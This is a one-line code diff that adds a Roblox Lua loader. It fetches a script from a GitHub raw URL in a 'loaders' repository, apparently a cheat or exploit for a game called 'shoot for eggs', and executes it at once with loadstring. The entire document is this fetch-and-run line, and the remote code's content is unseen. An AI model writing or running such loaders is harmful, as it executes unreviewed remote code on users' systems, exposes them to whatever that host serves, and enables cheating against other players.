@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/shoot-for-eggs-spam1-7gx10v5dfzap18.lua"))()
